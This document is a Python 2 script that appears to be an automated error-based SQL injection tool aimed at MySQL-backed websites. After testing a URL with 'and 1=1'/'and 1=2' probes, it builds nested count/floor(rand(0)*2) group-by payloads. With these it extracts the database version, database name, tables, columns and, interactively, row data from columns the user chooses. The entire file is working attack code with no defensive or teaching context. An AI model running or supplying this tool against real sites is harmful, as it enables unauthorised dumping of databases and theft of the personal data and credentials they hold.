import requests
import sys
from time import sleep
from prettytable import PrettyTable

page_length_success = 0
page_length_failure = 0

exploit_dict = {}
exploit_tables = {}
exploit_columnNames = {}
exploit_recordsCount = {}
exploit_recordsName = {}
tempObj = {}

'''
validate_vulnerable(url) takes the absolute path of url as input and validates
if the url is vulnerable. It also differentiates between success and failure 
messages if the url is vulnerable.
'''

def validate_vulnerable(url):
	success_url = url + " and 1=1"
	failure_url = url + " and 1=2"
	try:
		page_content = requests.get(url)
		page_content_success = requests.get(success_url)
		page_content_failure = requests.get(failure_url)

	except requests.exceptions.RequestException as e:
		print "Invalid URL!!!"
		print e
		sys.exit(1)

	page_success = page_content_success.text
	page_failure = page_content_failure.text

	global page_length_success
	global page_length_failure

	page_length = len(page_content.text)
	page_length_success = len(page_content_success.text)
	page_length_failure = len(page_content_failure.text)

	if page_length_success != page_length_failure and page_length == page_length_success:
		print "URL is vulnerable"
		return [page_length_success, page_length_failure]
	else:
		print "URL is not vulnerable"
		return None

def splitascii(hexVal):
	if "'~1'" in hexVal:
		tempHex = hexVal.split("'~1'")[0].split("'~'")[1]
		if "'" in tempHex:
			tempHex = tempHex.split("'")[0]
		return tempHex
	return '00'

def getVersion(url):
	exploitQuery = " and(select 1 from(select count(*),concat((select (select " \
				"concat(0x7e,0x27,Hex(cast(version() " \
				"as char)),0x27,0x7e)) from information_schema.tables" \
				" limit 0,1),floor(rand(0)*2))x from information_schema.tables group by x)a) and 1=1"
	res = requests.get(url + exploitQuery).text
	print "Version is: " + splitascii(res).decode('hex')

def getDatabase(url):
	exploitQuery = " and(select 1 from(select count(*),concat((select " \
				   "(select concat(0x7e,0x27,Hex(cast(database() as char)),0x27,0x7e)) " \
				   "from information_schema.tables limit 0,1),floor(rand(0)*2))x from " \
				   "information_schema.tables group by x)a) and 1=1"
	res = requests.get(url + exploitQuery).text
	exploit_dict['dbNameAscii'] = str(splitascii(res))
	exploitVal = exploit_dict['dbNameAscii'].decode('hex')
	exploit_dict['dbName'] = exploitVal
 	print "Database Name: " + exploitVal

def gettablescount(url):
	tempVal = exploit_dict.get('dbNameAscii')
	exploitQuery = " and(select 1 from(select count(*),concat((select (select (SELECT concat(0x7e,0x27,count(table_name)," \
				   "0x27,0x7e) FROM `information_schema`.tables WHERE table_schema=0x"+ tempVal + ")) " \
				   "from information_schema.tables limit 0,1),floor(rand(0)*2))x " \
				   "from information_schema.tables group by x)a) and 1=1"
	res = requests.get(url + exploitQuery).text
	exploitVal = splitascii(res)
	exploit_dict['tableCount'] = int(exploitVal)
	print "Number of Tables in the Database:" +  str(exploitVal)

def gettablenames(url):
	tempCount = exploit_dict.get('tableCount')
	tempVal = exploit_dict.get('dbNameAscii')
	exploit_dict['tableNames'] = []
	exploit_dict['tableNameAscii'] = []
	print "Fetching Table Names..."
	for i in range(0,tempCount):
		exploitQuery = " and(select 1 from(select count(*),concat((select (select (SELECT distinct " \
				   "concat(0x7e,0x27,Hex(cast(table_name as char)),0x27,0x7e) FROM information_schema.tables " \
				   "Where table_schema=0x"+tempVal+" limit "+str(i)+",1)) from information_schema.tables " \
				   "limit 0,1),floor(rand(0)*2))x from information_schema.tables group by x)a) and 1=1"
		res = requests.get(url + exploitQuery).text
		exploit_dict['tableNameAscii'].append(str(splitascii(res)))
		exploitVal = splitascii(res).decode('hex')
		exploit_dict['tableNames'].append(exploitVal)

def getcolumncount(url,tname):
	tempDBName = exploit_dict.get('dbNameAscii')
	tempTableNamesHex = exploit_dict.get('tableNameAscii')
	tempTableNames = exploit_dict.get('tableNames')
	tablesLen = len(tempTableNames)
	print "Fetching number of columns for table: " + tname
	temp = {}
	exploitQuery = " and(select 1 from(select count(*),concat((select (select (SELECT concat(0x7e,0x27," \
				   "count(column_name),0x27,0x7e) FROM `information_schema`.columns WHERE " \
				   "table_schema=0x"+ tempDBName +" AND table_name=0x"+ tname.encode('hex') +")) " \
				   "from information_schema.tables limit 0,1),floor(rand(0)*2))x " \
				   "from information_schema.tables group by x)a) and 1=1"
	res = requests.get(url + exploitQuery).text
	exploitVal = splitascii(res)
	temp['count'] = int(exploitVal)
	exploit_tables[tname] = temp

def getcolumnnames(url,tname):
	tempDBNameHex = exploit_dict.get('dbNameAscii')
	tempTableNamesHex = exploit_dict.get('tableNameAscii')
	tempTableNames = exploit_dict.get('tableNames')
	print "Fetching column names for table: " + tname
	tempArr = []
	tablecolumnCount = exploit_tables[tname].get('count')
	for j in range(0,tablecolumnCount):
		executeQuery = " and(select 1 from(select count(*),concat((select (select (SELECT distinct " \
					   "concat(0x7e,0x27,Hex(cast(column_name as char)),0x27,0x7e) FROM information_schema.columns " \
					   "Where table_schema=0x"+tempDBNameHex+" AND table_name=0x"+ tname.encode('hex') +" limit "+str(j)+",1))" \
					   " from information_schema.tables limit 0,1),floor(rand(0)*2))x from information_schema.tables group by x)a) and 1=1"
		res = requests.get(url + executeQuery).text
		exploitVal = splitascii(res)
		tempArr.append(exploitVal.decode('hex'))
		exploit_columnNames[tname] = tempArr

def getrowcount(url,tname):
	tempDBName = exploit_dict.get('dbName')
	tempTableNamesHex = exploit_dict.get('tableNameAscii')
	print "Fetching number of rows in table: " + tname
	tempObj = {}
	exploitQuery  = " and(select 1 from(select count(*),concat((select (select (SELECT concat(0x7e,0x27,count(*),0x27,0x7e) " \
					"FROM `"+ tempDBName +"`."+tname+")) from information_schema.tables limit 0,1)," \
					"floor(rand(0)*2))x from information_schema.tables group by x)a) and 1=1"
	res = requests.get(url + exploitQuery).text
	exploitVal = splitascii(res)
	tempObj["recCount"] = int(exploitVal)
	exploit_recordsCount[tname] = tempObj


def getrows(url,tname,cname,n):
	tempDBName = exploit_dict.get('dbName')
	print "Fetching rows in column: " + cname
	tempArr = []
	for j in range(0, n):
		exploitQuery = " and(select 1 from(select count(*),concat((select (select (SELECT concat(0x7e,0x27," \
					   "Hex(cast("+tname+"."+cname+" as char)),0x27,0x7e) FROM `"+ tempDBName +"`."+tname+" LIMIT "+str(j)+",1))" \
					   " from information_schema.tables limit 0,1),floor(rand(0)*2))x from information_schema.tables group by x)a) and 1=1"

		res = requests.get(url+exploitQuery).text
		exploitVal = splitascii(res)
		if exploitVal.decode('hex') == '\x00':
			tempArr.append('null')
		else:
			tempArr.append(exploitVal.decode('hex'))
	tempObj[cname] = tempArr
	exploit_recordsName[tname] = tempObj

if __name__ == "__main__":
	web_url = raw_input("Enter website with absolute url:\n").strip()
	status_code = validate_vulnerable(web_url)
	if status_code == None:
		sys.exit(0)

	getVersion(web_url)
	getDatabase(web_url)
	gettablescount(web_url)
	gettablenames(web_url)
	tables_loaded = []
	columns_loaded = {}
	while True:
		cols_temp = []
		print "Tables in this Database:"
		table_s = PrettyTable()
		table_s.add_column("Table_Names",exploit_dict['tableNames'])

		print table_s

		t_name = raw_input("Enter one table name to read data from: ").lower().strip()
		if t_name not in exploit_dict['tableNames']:
			print "Not a valid table"
			sys.exit(0)
		
		if t_name not in tables_loaded:	
			getcolumncount(web_url,t_name)
			getcolumnnames(web_url,t_name)
			getrowcount(web_url,t_name)
			tables_loaded.append(t_name)
		
		if t_name not in columns_loaded:
				columns_loaded[t_name] = cols_temp
		else:
			cols_temp = columns_loaded[t_name]
		
		row_count = exploit_recordsCount[t_name].get('recCount')
		
		print t_name + " has " + str(row_count) + " record(s)..."
		print "Columns in table " + t_name			
		column_s = PrettyTable()
		column_s.add_column("Column(s)",exploit_columnNames[t_name])
		print column_s
		
		cols = raw_input("Enter columns you want separated with ':' like 'col1:col2:col3' - ").lower().strip()
			

		cnms = cols.split(':')

		for i in cnms:
			if i not in exploit_columnNames[t_name]:
				print "Column " + i + " are not in table: " + t_name
				sys.exit(0)

		number_of_rows = int(raw_input("Enter number of rows you want to see: ").strip())
			
		if number_of_rows > row_count:
			print ">>>Warning: Table " + t_name + " has only " + str(row_count) + " row(s)."
			number_of_rows = row_count
			
		print "Data in table: " + t_name
			
		for i in cnms:
			if i not in columns_loaded[t_name]:
				getrows(web_url,t_name,i,number_of_rows)			
				cols_temp.append(i)
		
		columns_loaded[t_name] = cols_temp
		
		lol = exploit_recordsName[t_name]

		output = PrettyTable()
			
		for key,val in sorted(lol.iteritems()):
			output.add_column(key,sorted(val))
				
		print output
		choice = None	
		tempObj = {}	

		while choice != 'yes' and choice != 'no':		
			choice = raw_input(">>>Do you want to extract data from different table(s) or column(s): yes or no -->").lower().strip()
			if choice != 'yes' and choice != 'no':
				print ">>>Please enter yes or no"
		
		if choice == 'no':
			sys.exit(0)
